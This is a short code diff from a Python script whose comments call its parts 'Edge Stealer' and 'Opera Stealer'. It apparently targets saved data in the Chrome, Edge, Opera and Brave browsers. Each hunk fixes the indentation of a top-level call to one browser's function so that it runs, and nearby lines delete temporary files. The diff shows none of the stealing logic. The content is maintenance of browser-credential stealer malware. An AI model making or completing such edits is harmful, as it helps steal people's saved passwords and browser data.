@@ -139,7 +139,7 @@ def chrome():
     os.remove(f"{fn_chr}.txt")
 
 
- chrome()
+chrome()
 
 # Edge Stealer
 profiles_edge = glob.glob(os.path.join(edge_path_user_data, 'Default*/')) + glob.glob(
@@ -209,7 +209,7 @@ def edge():
     os.remove(f"{fn_edge}.txt")
 
 
- edge()
+edge()
 
 # Opera Stealer
 profiles_opera = glob.glob(os.path.join(opera_path_user_data, 'Default*/')) + glob.glob(
@@ -280,7 +280,7 @@ def opera():
     os.remove(f"{fn_opera}.txt")
 
 
- opera()
+opera()
 
 # Profiles Brave
 profiles_brave = glob.glob(os.path.join(brave_path_user_data, 'Default*/')) + glob.glob(
@@ -352,6 +352,6 @@ def brave():
     os.remove(f"{fn_brave}.txt")
 
 
- brave()
+brave()
 
 
